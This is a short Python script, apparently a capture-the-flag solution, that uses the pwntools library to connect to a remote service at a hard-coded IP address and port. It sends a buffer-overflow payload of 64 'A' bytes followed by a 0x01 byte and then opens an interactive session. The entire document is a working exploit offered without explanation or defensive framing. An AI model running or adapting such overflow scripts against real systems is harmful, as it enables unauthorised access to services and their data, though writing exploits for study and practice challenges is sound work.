from pwn import *

p = remote('134.112.58.12', 10010)

payload = b'A' * 64 + b'\x01'
p.sendline(payload)

p.interactive()